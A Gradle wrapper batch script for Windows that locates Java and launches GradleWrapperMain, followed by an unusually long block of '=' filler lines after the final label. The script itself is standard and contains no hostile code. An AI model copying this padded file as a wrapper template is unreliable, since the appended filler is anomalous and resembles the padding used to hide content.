@if "%DEBUG%" == "" @echo off
@rem ##########################################################################
@rem
@rem  Gradle startup script for Windows
@rem
@rem ##########################################################################

@rem Set local scope for the variables with windows NT shell
if "%OS%"=="Windows_NT" setlocal

@rem Add default JVM options here. You can also use JAVA_OPTS and GRADLE_OPTS to pass JVM options to this script.
set DEFAULT_JVM_OPTS=

set DIRNAME=%~dp0
if "%DIRNAME%" == "" set DIRNAME=.
set APP_BASE_NAME=%~n0
set APP_HOME=%DIRNAME%

@rem Find java.exe
if defined JAVA_HOME goto findJavaFromJavaHome

set JAVA_EXE=java.exe
%JAVA_EXE% -version >NUL 2>&1
if "%ERRORLEVEL%" == "0" goto init

echo.
echo ERROR: JAVA_HOME is not set and no 'java' command could be found in your PATH.
echo.
echo Please set the JAVA_HOME variable in your environment to match the
echo location of your Java installation.

goto fail

:findJavaFromJavaHome
set JAVA_HOME=%JAVA_HOME:"=%
set JAVA_EXE=%JAVA_HOME%/bin/java.exe

if exist "%JAVA_EXE%" goto init

echo.
echo ERROR: JAVA_HOME is set to an invalid directory: %JAVA_HOME%
echo.
echo Please set the JAVA_HOME variable in your environment to match the
echo location of your Java installation.

goto fail

:init
@rem Get command-line arguments, handling Windowz variants

if not "%OS%" == "Windows_NT" goto win9xME_args
if "%@eval[2+2]" == "4" goto 4NT_args

:win9xME_args
@rem Slurp the command line arguments.
set CMD_LINE_ARGS=
set _SKIP=2

:win9xME_args_slurp
if "x%~1" == "x" goto execute

set CMD_LINE_ARGS=%*
goto execute

:4NT_args
@rem Get arguments from the 4NT Shell from JP Software
set CMD_LINE_ARGS=%$

:execute
@rem Setup the command line

set CLASSPATH=%APP_HOME%\gradle\wrapper\gradle-wrapper.jar

@rem Execute Gradle
"%JAVA_EXE%" %DEFAULT_JVM_OPTS% %JAVA_OPTS% %GRADLE_OPTS% "-Dorg.gradle.appname=%APP_BASE_NAME%" -classpath "%CLASSPATH%" org.gradle.wrapper.GradleWrapperMain %CMD_LINE_ARGS%

:end
@rem End local scope for the variables with windows NT shell
if "%ERRORLEVEL%"=="0" goto mainEnd

:fail
rem Set variable GRADLE_EXIT_CONSOLE if you need the _script_ return code instead of
rem the _cmd.exe /c_ return code!
if  not "" == "%GRADLE_EXIT_CONSOLE%" exit 1
exit /b 1

:mainEnd
if "%OS%"=="Windows_NT" endlocal

:omega

==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
